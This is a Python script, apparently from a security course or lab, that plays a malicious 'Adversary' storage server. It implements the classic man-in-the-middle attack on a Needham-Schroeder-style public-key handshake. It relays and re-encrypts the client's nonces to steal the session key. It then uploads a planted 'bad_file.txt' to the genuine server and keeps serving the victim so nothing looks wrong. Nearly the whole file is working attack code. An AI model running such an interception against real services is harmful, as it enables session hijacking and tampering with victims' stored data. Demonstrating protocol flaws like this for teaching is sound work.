"""
This file represents Adversary, a malicious file storage server.
"""
from socket import socket, AF_INET, SOCK_STREAM
import subprocess, sys, os
from helpers import *


NAME = "adversary"

def attack(conn):
    """(socket) -> (bytes, str) or NoneType
    Performs a man-in-the-middle attack between the client and Bob's storage server.
    Returns the session key and clients name if attack was successful, otherwise
    returns None.

    :conn: connection to the client (victim)
    """
    # get RSA key of Adversary for decrypting
    with open("RsaKey.asc", "r") as fileStream:
        buffer = fileStream.read()
    M_sk = rsa.import_key(str.encode(buffer))

    # A -- {N_A, A}(KP_M) --> M
    recv_data = conn.recv(1024)
    plaintext = rsa.big_decrypt(M_sk, recv_data.split(b','))
    client_name = plaintext[plaintext.rfind(','):]
    # get public key of Server for encrypting
    PKI_address = (PKI_HOST, PKI_PORT)
    buffer_B = ns.get_public_key(PKI_address, "server", NAME, M_sk)
    B_pk = rsa.import_key(buffer_B)

    # reencrypt request for Server
    cipher = rsa.big_encrypt(B_pk, plaintext)
    send_byte = b''
    for chunk in cipher:
        send_byte += chunk + b','

    # open connection with Server
    server_address = (SERVER_HOST, SERVER_PORT)
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect(server_address)
        # M -- {N_A, A}(KP_B) --> B
        sock.send(send_byte[:-1])
        # M <-- {N_A, N_B}(KP_A) -- B
        recv_data = sock.recv(1024)
        # A <-- {N_A, N_B}(KP_A) -- M
        conn.send(recv_data)
        # A -- {K, N_B}(KP_M) --> M
        recv_data = conn.recv(1024)
        plaintext = rsa.big_decrypt(M_sk, recv_data.split(b','))
        ssn_key = plaintext[:plaintext.rfind(',')].encode("UTF-8")
        # M -- {K, N_B}(KP_B) --> B
        cipher = rsa.big_encrypt(B_pk, plaintext)
        send_byte = b''
        for chunk in cipher:
            send_byte += chunk + b','
        sock.send(send_byte[:-1])
        # check if MITM attack was successful
        if int(sock.recv(1024)) == RESP_VERIFIED:
            print("Adversary: I got in!")
            upload_bad_file(sock, ssn_key)
            return ssn_key, client_name
        else:
            print("Adversary: wtf...")
        print("Adversary: attack completed")





def serve_client_after_attack(conn, ssn_key, client_name):
    """(socket, bytes, str) -> NoneType

    Service the client after the attack to appear normal.

    :conn: connection to client
    :ssn_key: session key for symmetric encryption
    :client_name: name of client
    """
    # verify and serve the victim
    conn.sendall(bytes(str(RESP_VERIFIED), "utf-8"))

    # get file name and mode of transfer
    request = aes.decrypt(ssn_key, conn.recv(1024))
    file_name, mode = request.split(',')
    response = aes.encrypt(ssn_key, SIG_GOOD)
    print("Adversary: recieved request of file {} for mode {}".format(file_name, mode))

    # serve to upload or download the file
    if mode == UPLOAD:
        conn.sendall(response)
        serve_upload(conn, ssn_key, file_name, client_name)

    # if download, check if file exists
    elif mode == DOWNLOAD:
        file_path = "{}/{}".format(client_name, file_name)
        if os.path.isfile(file_path):
            conn.sendall(response)
            serve_download(conn, ssn_key, file_name, client_name)
        else:
            response = aes.encrypt(ssn_key, SIG_BAD)
            conn.sendall(response)
            print("Adversary: {} does not exist in server, exiting...".format(file_name))


def serve_upload(conn, ssn_key, file_name, client_name):
    """(socket, bytes, str, str) -> NoneType

    Downloads the file for the client is uploading.

    :conn: connection to client
    :ssn_key: session key for symmetric encryption
    :file_name: name of file to upload
    :client_name: name of client
    """
    # get signal to begin upload
    request = aes.decrypt(ssn_key, conn.recv(1024))
    if request != SIG_START:
        conn.sendall(aes.encrypt(ssn_key, SIG_BAD))
        return print("Adversary: something went wrong with file transfer")
    response = aes.encrypt(ssn_key, SIG_GOOD)
    conn.sendall(response)
    print("Adversary: beginning transfer for {}...".format(file_name))

    # get file contents from client
    contents = list()
    completed_upload = False
    response = aes.encrypt(ssn_key, SIG_GOOD)
    while not completed_upload:
        request = aes.decrypt(ssn_key, conn.recv(1024))
        if request == SIG_END:
            completed_upload = True
            print("Adversary: completed transfer for {}".format(file_name))
        else:
            contents.append(request)
        conn.sendall(response)

    # save file to server folder
    file_path = "{}/{}".format(client_name, file_name)
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, "w") as outputStream:
        outputStream.write(''.join(contents))
    print("Adversary: file saved in {}".format(file_path))


def serve_download(conn, ssn_key, file_name, client_name):
    """(socket, bytes, str, str) -> NoneType

    Uploads the file for the client is downloading.

    :conn: connection to client
    :ssn_key: session key for symmetric encryption
    :file_name: name of file to download
    :client_name: name of client
    """
    # read file contents
    file_path = "{}/{}".format(client_name, file_name)
    contents = None
    with open(file_path, "r") as fileStream:
        buffer = fileStream.read()
        contents = [buffer[0+i:16+i] for i in range(0, len(buffer), 16)]
    # get signal to begin download
    request = aes.decrypt(ssn_key, conn.recv(1024))
    if request != SIG_START:
        conn.sendall(aes.encrypt(ssn_key, SIG_BAD))
        return print("Adversary: something went wrong with file transfer")
    print("Adversary: beginning transfer for {}...".format(file_name))
    # upload file contents to client
    for i, content in enumerate(contents):
        response = aes.encrypt(ssn_key, content)
        conn.sendall(response)
        if aes.decrypt(ssn_key, conn.recv(1024)) != SIG_GOOD:
            return print("Adversary: something went wrong with file transfer, exiting...")
        print("Adversary: transferring file... ({}/{})".format(i+1, len(contents)))
    # send signal that transfer is complete
    request = aes.encrypt(ssn_key, SIG_END)
    conn.sendall(request)
    if aes.decrypt(ssn_key, conn.recv(1024)) != SIG_GOOD:
        return print("Adversary: something went wrong with file transfer, exiting...")
    print("Adversary: successful upload for {}".format(file_name))


def upload_bad_file(sock, ssn_key):
    """(socket, bytes) -> NoneType

    Uploads a malicious file to the legitmate storage server.

    :sock: connection to storage server
    :ssn_key: session key for symmetric encryption
    """
    # file to upload
    file_name = "bad_file.txt"

    # read file contents
    contents = None
    with open(file_name, "r") as fileStream:
        buffer = fileStream.read()
        contents = [buffer[0+i:16+i] for i in range(0, len(buffer), 16)]
    print("Adversary: {} is read and ready for upload".format(file_name))

    # send file name
    req_bob = "{},{}".format(file_name, UPLOAD)
    sock.sendall(aes.encrypt(ssn_key, req_bob))
    if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
        return print("Adversary: something went wrong with file transfer, exiting...")
    print("Adversary: uploaded file name {}".format(file_name))

    # send signal to begin upload of contents
    sock.sendall(aes.encrypt(ssn_key, SIG_START))
    if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
        return print("Adversary: something went wrong with file transfer, exiting...")
    print("Adversary: beginning file upload...")

    # upload file contents
    for i, content in enumerate(contents):
        sock.sendall(aes.encrypt(ssn_key, content))
        if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
            return print("Adversary: something went wrong with file transfer, exiting...")
        print("Adversary: uploading file... ({}/{})".format(i+1, len(contents)))

    # send signal that upload is complete
    sock.sendall(aes.encrypt(ssn_key, SIG_END))
    if aes.decrypt(ssn_key, sock.recv(1024)) != SIG_GOOD:
        return print("Adversary: something went wrong with file transfer, exiting...")
    print("Adversary: successful upload for {}".format(file_name))



def main():
    """() -> NoneType

    Performs a man-in-the-middle attack between the client and the storage server,
    then services the client after the attack.

    REQ: server.py is running
    """
    # begin to 'serve' client
    with socket(AF_INET, SOCK_STREAM) as sock_main:
        sock_main.bind((ADV_HOST, ADV_PORT))
        sock_main.listen()
        conn, addr = sock_main.accept()
        with conn:
            print('Adversary: connection from client with address', addr)
            while True:
                # begin the attack
                result = attack(conn)
                if result:
                    ssn_key, client_name = result
                    # verify and serve the victim
                    serve_client_after_attack(conn, ssn_key, client_name)
                # done, stop server
                return print("Adversary: shutting down server...")


if __name__ == "__main__":
    print("Adversary: malicious storage server")
    print("Adversary: beginning to 'serve' clients...")
    main()
